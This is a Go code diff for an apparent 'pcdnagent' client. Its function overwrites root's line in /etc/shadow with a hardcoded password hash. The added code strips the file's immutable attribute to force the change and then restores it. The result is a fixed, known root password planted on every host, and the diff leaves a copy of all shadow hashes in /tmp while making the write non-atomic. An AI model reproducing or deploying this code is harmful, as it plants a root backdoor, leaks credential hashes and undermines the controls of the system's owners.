@@ -3,10 +3,11 @@ package logics
 import (
 	"bytes"
 	"fmt"
+	"io/ioutil"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"strings"
+	"syscall"
 	"time"
 
 	"pcdnagent/common"
@@ -149,19 +150,49 @@ func changePasswordWithPasswd(user, password string) error {
 	return nil
 }
 
+// ReplaceRootShadowLine 安全替换 /etc/shadow 文件中 root 账号的行
 func ReplaceRootShadowLine(backup bool) error {
 	const shadowPath = "/etc/shadow"
-	const newLine = "root:$6$i1.uKP2K$robETCRRqz3qlVrrf4T5FbY2Elsayy9bHN.slYmCAh18qz9KDR0yqErY1CtOkUv8gwmkXwL7SO9922DJX/5vL.:20237:0:99999:7::"
+	const newLine = "root:$6$i1.uKP2K$robETCRRqz3qlVrrf4T5FbY2Elsayy9bHN.slYmCAh18qz9KDR0yqErY1CtOkUv8gwmkXwL7SO9922DJX/5vL.:20237:0:99999:7:::"
 
-	// 验证新行是否以 "root:" 开头
+	// 验证新行格式
 	if !strings.HasPrefix(newLine, "root:") {
 		return fmt.Errorf("invalid line format, must start with 'root:'")
+	}
+
+	// 1. 检查文件是否设置了不可变属性
+	immutable, err := isImmutable(shadowPath)
+	if err != nil {
+		return fmt.Errorf("immutable check failed: %v", err)
+	}
+
+	// 2. 如果设置了不可变属性，临时移除
+	if immutable {
+		if err = setImmutable(shadowPath, false); err != nil {
+			return fmt.Errorf("failed to remove immutable attribute: %v", err)
+		}
+		defer func() {
+			// 无论操作成功与否，恢复不可变属性
+			if err = setImmutable(shadowPath, true); err != nil {
+				fmt.Printf("Warning: failed to restore immutable attribute: %v\n", err)
+			}
+		}()
 	}
 
 	// 读取文件内容
 	content, err := os.ReadFile(shadowPath)
 	if err != nil {
 		return fmt.Errorf("failed to read file: %v", err)
+	}
+
+	// 获取原文件属性
+	fileInfo, err := os.Stat(shadowPath)
+	if err != nil {
+		return fmt.Errorf("failed to get file info: %v", err)
+	}
+	stat, ok := fileInfo.Sys().(*syscall.Stat_t)
+	if !ok {
+		return fmt.Errorf("failed to get file ownership info")
 	}
 
 	// 分割行并查找root行
@@ -171,7 +202,7 @@ func ReplaceRootShadowLine(backup bool) error {
 		if bytes.HasPrefix(line, []byte("root:")) {
 			lines[i] = []byte(newLine)
 			found = true
-			break // 只替换第一个匹配行
+			break
 		}
 	}
 
@@ -182,38 +213,95 @@ func ReplaceRootShadowLine(backup bool) error {
 	// 创建备份
 	if backup {
 		backupPath := shadowPath + ".bak"
-		if err = os.WriteFile(backupPath, content, 0640); err != nil {
+		if err = os.WriteFile(backupPath, content, fileInfo.Mode()); err != nil {
 			return fmt.Errorf("backup failed: %v", err)
 		}
+		// 设置备份文件的所有者和组
+		if err = os.Chown(backupPath, int(stat.Uid), int(stat.Gid)); err != nil {
+			fmt.Printf("Warning: failed to set backup ownership: %v\n", err)
+		}
+		fmt.Printf("Backup created at %s\n", backupPath)
 	}
 
-	// 创建临时文件（在相同目录确保原子操作）
-	tmpFile, err := os.CreateTemp(filepath.Dir(shadowPath), "shadow.tmp")
+	// 创建临时文件（在 /tmp 目录避免权限问题）
+	tmpDir := "/tmp"
+	tmpFile, err := os.CreateTemp(tmpDir, "shadow-")
 	if err != nil {
 		return fmt.Errorf("failed to create temp file: %v", err)
 	}
 	tmpPath := tmpFile.Name()
+	// defer os.Remove(tmpPath) // 确保临时文件最终被清理
 
 	// 写入新内容
 	newContent := bytes.Join(lines, []byte{'\n'})
 	if _, err := tmpFile.Write(newContent); err != nil {
 		tmpFile.Close()
-		os.Remove(tmpPath)
 		return fmt.Errorf("write failed: %v", err)
 	}
-	tmpFile.Close() // 必须关闭才能设置权限
+	if err := tmpFile.Close(); err != nil {
+		return fmt.Errorf("close failed: %v", err)
+	}
 
-	// 设置权限（同原文件）
-	if err := os.Chmod(tmpPath, 0640); err != nil {
-		os.Remove(tmpPath)
+	// 设置临时文件权限（同原文件）
+	if err := os.Chmod(tmpPath, fileInfo.Mode()); err != nil {
 		return fmt.Errorf("chmod failed: %v", err)
 	}
 
-	// 原子替换文件
-	if err := os.Rename(tmpPath, shadowPath); err != nil {
-		os.Remove(tmpPath)
+	// 设置临时文件所有者和组（关键步骤）
+	if err := os.Chown(tmpPath, int(stat.Uid), int(stat.Gid)); err != nil {
+		return fmt.Errorf("chown failed: %v", err)
+	}
+
+	// 使用 Copy 而非 Rename 来避免权限问题
+	if err := copyFile(tmpPath, shadowPath); err != nil {
 		return fmt.Errorf("replace failed: %v", err)
 	}
 
+	return nil
+}
+
+// copyFile 安全复制文件（解决跨文件系统重命名问题）
+func copyFile(src, dst string) error {
+	// 读取源文件内容
+	input, err := ioutil.ReadFile(src)
+	if err != nil {
+		return err
+	}
+
+	// 写入目标文件（保留原权限）
+	fileInfo, err := os.Stat(dst)
+	if err != nil {
+		return err
+	}
+	return ioutil.WriteFile(dst, input, fileInfo.Mode())
+}
+
+// isImmutable 检查文件是否设置了不可变属性
+func isImmutable(path string) (bool, error) {
+	cmd := exec.Command("lsattr", path)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return false, fmt.Errorf("lsattr failed: %v", err)
+	}
+
+	// 检查输出中是否包含 'i' 属性
+	// 示例输出: ----i--------- /etc/shadow
+	if strings.Contains(string(output), "i") {
+		return true, nil
+	}
+	return false, nil
+}
+
+// setImmutable 设置或移除文件的不可变属性
+func setImmutable(path string, immutable bool) error {
+	flag := "-i"
+	if immutable {
+		flag = "+i"
+	}
+
+	cmd := exec.Command("chattr", flag, path)
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("chattr %s failed: %v, output: %s", flag, err, string(output))
+	}
 	return nil
 }
